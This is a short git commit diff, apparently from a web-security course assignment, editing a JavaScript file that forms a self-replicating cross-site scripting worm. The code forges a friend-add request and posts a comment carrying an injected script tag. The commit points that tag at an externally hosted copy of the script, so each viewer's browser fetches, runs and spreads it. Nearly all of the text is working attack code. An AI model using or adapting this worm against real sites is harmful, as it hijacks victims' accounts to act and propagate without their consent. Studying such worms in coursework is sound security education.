18a70a86af824ef6c8e03aa921d95b51a396410c
homework6-dev <57599709+homework6-dev@users.noreply.github.com>
2019-11-10 13:58:43 -0500

    added src url

--- script.js
+++ script.js
@@ -1,7 +1,7 @@
 a=new XMLHttpRequest();
 a.open('POST','/add_friend.php?id=18',true);
 a.send();
-b='hello, friend<script type="text/javascript" src=""></script>';
+b='hello, friend<script type="text/javascript" src="https://homework6-dev.github.io/hw6/script.js"></script>';
 c=new XMLHttpRequest();
 c.open('GET','/add_comment.php?comment='+b,true);
 c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
